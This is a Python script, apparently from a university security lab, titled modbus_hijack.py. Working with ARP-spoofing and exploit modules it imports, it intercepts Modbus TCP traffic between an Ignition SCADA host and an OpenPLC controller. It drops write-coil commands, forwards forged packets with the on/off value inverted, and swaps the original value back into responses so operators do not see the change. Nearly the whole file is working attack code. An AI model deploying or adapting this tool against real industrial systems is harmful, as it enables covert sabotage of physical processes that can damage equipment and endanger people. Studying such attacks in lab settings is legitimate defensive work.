#!/usr/bin/env python3
"""
file:       modbus_hijack.py
author:     Chris Tremblay <cst1465@rit.edu>
language:   Python3
date:       02/09/2023, National Pizza Day!
description:
    This reads and writes to a coil
"""

import time
from pymodbus.client.sync import ModbusTcpClient as ModbusClient
from scapy.all import *
import struct
import arp_spoof
import final_exploit
import threading
from netfilterqueue import NetfilterQueue
import subprocess
import color_prefixes as cp
import copy
import traceback
import signal 

# constants
OPEN_PLC_IP = "192.168.1.35"
PLC_IP = None
PLC_MAC = None
IGNITION_IP = None
IGNITION_MAC = None
IFACE = None
VERBOSE = True

# MODBUS function code
FC_READ_COIL    = 1
FC_DISCREET_IN  = 2
FC_SINGLE_COIL  = 5

# MODBUS output values
OUT_ON = 0xFF00
OUT_OFF = 0x0000

# address of modbus device
OPENPLC_ADDR = "192.168.1.35"
OPENPLC_PORT = 502
IX100_0 = 800
IX100_1 = 801
IX100_2 = 802
IX100_3 = 803
IX100_4 = 804
IX100_5 = 805
IX100_6 = 806
IX100_7 = 807

# maps a transaction id -> proper response 
# this is needed to distinguish between requests and responses
STATE_DICT = dict()

def add_iptables_rule():
    """
    description:
        Add rule to iptables to route to a network queue
    returns:
        true -> on success
        false -> otherwise
    """
    try:
        ret = subprocess.call( "./iptables_to_netfilter_queue.sh", shell=True)
        if( ret != 0 ):
            print( cp.RED_PREFIX + "Adding iptables rule failed. Subprocess returned %d" % (ret) + cp.RED_SUFFIX )
            return False
    except Exception as e:
        print( cp.RED_PREFIX + "iptable to nfqueue: " + str(e) + cp.RED_SUFFIX )
        return False
    return True

def flush_ip_tables():
    """
    description:
        Flush iptables rules
    returns:
        true -> on success
        false -> otherwise
    """
    try:
        ret = subprocess.call( "./iptables_no_netfilter_queue.sh", shell=True)
        if( ret != 0 ):
            print( cp.RED_PREFIX + "Removing iptables rule failed. Subprocess returned %d" % (ret) + cp.RED_SUFFIX )
            return False
    except Exception as e:
        print( cp.RED_PREFIX + "iptable to nfqueue: " + str(e) + cp.RED_SUFFIX )
        return False
    return True
    
def sig_term_handler( sig, frame ):
    """
    description:
        flushes iptables rules
        closes netfilter queue
    parameters:
        sig -> the signal to be processed
        frame -> the current stack frame
    """
    if( sig == signal.SIGTERM ):
        # flush firewall rules
        print( cp.YELLOW_PREFIX + "Flushing iptables rules" + cp.YELLOW_SUFFIX )
        flush_ip_tables()

        # unbind netfilter queue
        for f in traceback.walk_stack( frame ):
            name = f[0].f_code.co_name 
            local_vars = f[0].f_locals
            if( name == 'modbus_hijack'):
                print( cp.YELLOW_PREFIX + "Unbinding NetfilterQueue" + cp.YELLOW_SUFFIX )
                local_vars['nfqueue'].unbind()
                exit()
    return

# packet filter 
#FILTER = "host %s and port 502" % OPEN_PLC_IP # filter by plc host and mbtcp port
FILTER = "tcp and (not arp) and (host %s or host %s)"
def packet_handler( packet ):
    """
    description:
        the function that handles what to do with a packet
    parameters:
        packet -> the packet recieved
    """
    # make sure we have tcp packet
    try:
        pkt = IP( packet.get_payload() )
    except Exception as e:
        print(e)
        packet.accept()
        return

    # determine src and dst mac based on ip
    dmac = None
    smac = None
    request = False
    if( pkt[IP].dst == PLC_IP ):
        dmac = PLC_MAC
        smac = IGNITION_MAC
        request = True
    elif( pkt[IP].dst == IGNITION_IP  ):
        dmac = IGNITION_MAC
        smac = PLC_MAC

    # try to extract modbus
    try:
        trans_id, proto_id, length, unit_id, func_code, = \
                struct.unpack( "!HHHBB", pkt[Raw].load[:8] )
        if( func_code == FC_SINGLE_COIL ):
            # drop packet since it is write traffic
            print( "dropping packet", pkt.summary() )
            packet.drop()
            pkt.show()

            # get other fields out of modbus packet
            out_addr, out_val = struct.unpack( "!HH", pkt[Raw].load[8:13] )
            print("out addr:", out_addr, "outval:", out_val)
            
            # create maliciuos load and ethernet frame for request
            eth = Ether( \
                    src = smac, \
                    dst = dmac,
                    type = packet.hw_protocol
            )
            if( request ):
                # take care of payload
                if( trans_id in STATE_DICT ):
                    print( "trans_id", trans_id, "already exists")
                    return
                STATE_DICT[trans_id] = copy.deepcopy( pkt[Raw].load )
                print( "added statedict", trans_id )
                if( out_val == OUT_ON ):
                    print( "detected turn coil on, spoofing off")
                    spoof_data = OUT_OFF    
                else:
                    print( "detected turn coil off, spoofing on")
                    spoof_data = OUT_ON

                # convery bytes to bytearray, and manipulate load
                ar = bytearray( pkt[Raw].load )
                ar[8:13] = struct.pack( "!HH", out_addr, spoof_data )
                pkt[Raw].load = bytes( ar )
            else:
                if( not trans_id in STATE_DICT ):
                    print( "trans_id", trans_id, "not in statedict but should be?")
                    return
                pkt[Raw].load = STATE_DICT.pop( trans_id )
                print( "removed statedict", trans_id )
            new_packet = eth/pkt
            del new_packet[TCP].chksum
            del new_packet[IP].chksum
            sendp( new_packet, iface=IFACE, verbose=VERBOSE )
        else:
            packet.accept()
    except IndexError:
        packet.accept() #squash 
    except Exception as e:
        exc_type, exc_obj, exc_tb = sys.exc_info()
        traceback.print_exc()
        print(cp.RED_PREFIX + "packet error lineno %d " % (exc_tb.tb_lineno) + str(e) + cp.RED_SUFFIX )
        packet.accept()
    return

def modbus_hijack( pip, pmac, iip, imac, iface):
    """
    description:
        The modbus hijack attack
        starts sniffing for packets and when a write coil modbus
        packet is found, it will change the value to be the opposite
        (on -> off, off -> on) and forward it 
    parameters:
        pip -> the ip of plc
        pmac -> the mac of plc
        iip -> the ip of ignition
        imac -> the mac of ignition
        iface -> the network interface to use
    """
    # add signal handler
    signal.signal( signal.SIGTERM, sig_term_handler )

    # add ip table rule for a netfilterqueue
    add_iptables_rule()

    # take care of scoping variables
    global PLC_IP
    global PLC_MAC
    global IGNITION_IP
    global IGNITION_MAC
    global IFACE
    PLC_IP = pip
    PLC_MAC = pmac
    IGNITION_IP = iip
    IGNITION_MAC = imac
    IFACE = iface

    # start netfilter queue
    nfqueue = NetfilterQueue()
    nfqueue.bind( 1, packet_handler )
    try:
        nfqueue.run()
    except Exception as e:
        print(cp.RED_PREFIX + str(e) + cp.RED_SUFFIX )
    nfqueue.unbind()
    return

def main():
    """
    description:
        the driver function     
    """
    # connect to PLC
    client = ModbusClient( OPENPLC_ADDR, port=OPENPLC_PORT )
    client.connect()
    print( client )

    rr = client.read_coils( IX100_0 )
    print( rr )
    for i in range( len( rr.bits ) ):
        print( rr.bits[i] )
    print()

    client.write_coil( IX100_6, True, unit=1 )
    client.read_coils( IX100_0 )
    for i in range( len( rr.bits ) ):
        print( rr.bits[i] )
    print()

    client.close()  
    return

if( __name__ == "__main__" ):
    main()
